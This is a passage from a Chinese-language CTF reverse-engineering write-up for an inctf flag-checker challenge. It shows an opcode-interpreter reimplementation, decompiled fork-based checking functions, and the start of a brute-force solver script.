class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">129</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,&#125;;</span><br><span class="line"><span class="keyword">char</span> talble[<span class="number">350</span>]=<span class="string">&quot;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff30030587801234562301034123801234412115345567801232762751324567803356468145234567423634656801234567801234567801234567801234567801234567801234567801234567801234567801234567801234567801234567801248577878274567801215767600234567086284567Good Job!&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,k;</span><br><span class="line"><span class="keyword">int</span> v7=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3829</span>; i += v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( opcode[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mov eax table[ebx]\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Checking flag...\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mov ebx %d\n&quot;</span>,opcode[i + <span class="number">1</span>]) ;</span><br><span class="line">        v7 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mov ebx hex(ebx)\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;add ebx 1  k=%d\n&quot;</span>,k);</span><br><span class="line">        k++;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mov eax flag[%d]\n&quot;</span>,opcode[i + <span class="number">1</span>]) ;</span><br><span class="line">        v7 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mov ebx eax\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;new[%d]=eax\n&quot;</span>,opcode[i + <span class="number">1</span>]);</span><br><span class="line">        v7 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;func(new[] to array[])\n&quot;</span>);</span><br><span class="line">k=<span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cmp talbe[ebx] array[k++]\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;check eax mod 9 == %d\n&quot;</span>,opcode[i + <span class="number">1</span>]);</span><br><span class="line">        v7 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good\n&quot;</span>);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mov eax flag[<span class="number">0</span>]</span><br><span class="line">check eax mod <span class="number">9</span> == <span class="number">6</span><span class="comment">//有这个约束条件就可以得到准确的flag。</span></span><br><span class="line">mov ebx eax</span><br><span class="line">mov ebx hex(ebx)<span class="comment">//这个hex的意思是将flag[0]转为int，然后在前面直接加上0x，比如说flag[0]=105，就会变成0x105</span></span><br><span class="line">mov eax table[ebx]</span><br><span class="line"><span class="keyword">new</span>[<span class="number">0</span>]=eax<span class="comment">//将table[ebx]的值给一个数组，这个数组会作为下面func()函数的参数，然后函数是switch case和很多包含fork()函数的函数，根据new[]的不同，就会产生不同的长字符串。</span></span><br><span class="line">mov eax flag[<span class="number">8</span>]</span><br><span class="line">check eax mod <span class="number">9</span> == <span class="number">5</span></span><br><span class="line">mov ebx eax</span><br><span class="line">mov ebx hex(ebx)</span><br><span class="line">mov eax table[ebx]</span><br><span class="line"><span class="keyword">new</span>[<span class="number">1</span>]=eax</span><br><span class="line">mov eax flag[<span class="number">16</span>]</span><br><span class="line">check eax mod <span class="number">9</span> == <span class="number">8</span></span><br><span class="line">mov ebx eax</span><br><span class="line">mov ebx hex(ebx)</span><br><span class="line">mov eax table[ebx]</span><br><span class="line"><span class="keyword">new</span>[<span class="number">2</span>]=eax</span><br><span class="line">mov eax flag[<span class="number">24</span>]</span><br><span class="line">check eax mod <span class="number">9</span> == <span class="number">3</span></span><br><span class="line">mov ebx eax</span><br><span class="line">mov ebx hex(ebx)</span><br><span class="line">mov eax table[ebx]</span><br><span class="line"><span class="keyword">new</span>[<span class="number">3</span>]=eax</span><br><span class="line">mov eax flag[<span class="number">31</span>]</span><br><span class="line">check eax mod <span class="number">9</span> == <span class="number">3</span></span><br><span class="line">mov ebx eax</span><br><span class="line">mov ebx hex(ebx)</span><br><span class="line">mov eax table[ebx]</span><br><span class="line"><span class="keyword">new</span>[<span class="number">4</span>]=eax</span><br><span class="line">func(<span class="keyword">new</span>[] to <span class="built_in">array</span>[])</span><br><span class="line">mov ebx <span class="number">140</span></span><br><span class="line">mov ebx hex(ebx)</span><br><span class="line">Checking flag...<span class="comment">//然后比较</span></span><br><span class="line"></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">0</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">1</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">2</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">3</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">4</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">5</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">add ebx <span class="number">1</span>  k=<span class="number">6</span></span><br><span class="line">cmp talbe[ebx] <span class="built_in">array</span>[k++]</span><br><span class="line">···</span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>上面的只是一轮，共8轮，每次回用到4~5个flag字符。每轮大概思路就是几个flag字符生成一个new数组，然后new数组通过一个函数生成一个比较长的字符串，然后和程序给定的值进行比较。</p><p>接下来来看func()函数，也就是sub_117B()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_117B</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *new_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [rsp+17h] [rbp-39h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v4; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1F4</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1F4</span>uLL);</span><br><span class="line">  v4 = getpid();                                <span class="comment">// 得到父进程的pid</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(new_1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( new_1[i] )                         <span class="comment">// 下面的函数，里面就是fork()函数，和给malloc申请的v6赋值，对于fork()这个函数，其会返回2次，然后根据不同的判断条件，又会产生多种可能，就是存在超多个进程，所以就算是一个字符，也会变成字符串，这也是为什么程序中字符串那么长的原因</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        sub_CCE(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        sub_D33(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        sub_DB3(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        sub_E33(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        sub_EF4(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        sub_F59(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">        sub_101C(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">        sub_10C6(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">        sub_1129(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;at&quot;</span>);                <span class="comment">// 打开或创建check文件，用来保存v6</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;wt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can not open check file for writing.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fputs</span>(v6, stream);                            <span class="comment">// 将v6写入check文件</span></span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != getpid() )                         <span class="comment">// 确定返回了父进程</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;r&quot;</span>);                 <span class="comment">// 以读的方式来打开check函数</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Cannot open check file for reading&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( src = fgetc(stream); src != <span class="number">-1</span>; src = fgetc(stream) )<span class="comment">// 读入dest</span></span><br><span class="line">    <span class="built_in">strncat</span>(dest, &amp;src, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( remove(<span class="string">&quot;check&quot;</span>) )                        <span class="comment">// 删除check文件</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nUnable to delete the file&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> dest;                                  <span class="comment">// 返回dest</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，我就想能不能直接通过fork()函数产生的字符串直接得到new[]，但是最多就减少一些爆破的字符，而且出题人在社区里面发了一段话</p><pre><code>For flagchecker, it becomes way easier if you get the parent process from each cmp string. Parent process&#39;s output for each set of 4/5 char will always be at the end(thanks to multiple wait checks in the functions). If you can figure out the parent, you can   actually figure out the path it takes checking which all numbers that are being appended into the check file from the parent. That narrows it down a lot. And then it&#39;s just trying out the different path that parent might takes out of those.对于flagchecker，如果您从每个cmp字符串中获取父进程，它将变得更加容易。父进程对每组4/5字符的输出将始终位于末尾（由于函数中有多个等待检查）。如果您可以找出父项，那么实际上可以找出检查从父项追加到检查文件中的所有数字所采用的路径。这就缩小了范围。然后，它只是尝试不同的路径，家长可能会采取这些。</code></pre><p>确实也只能减少爆破范围，于是做题时我就仿照程序写了个脚本，并且可以根据inctf{}格式来减少爆破范围。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">133</span>]=<span class="string">&quot;3433423443344234633462346334623133123143314231633162316331622432422443244224632&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_CCE</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fork() || !fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = wait(<span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)v1 = <span class="number">53</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">sub_D33</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)result = <span class="number">49</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)result = <span class="number">52</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">sub_DB3</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span 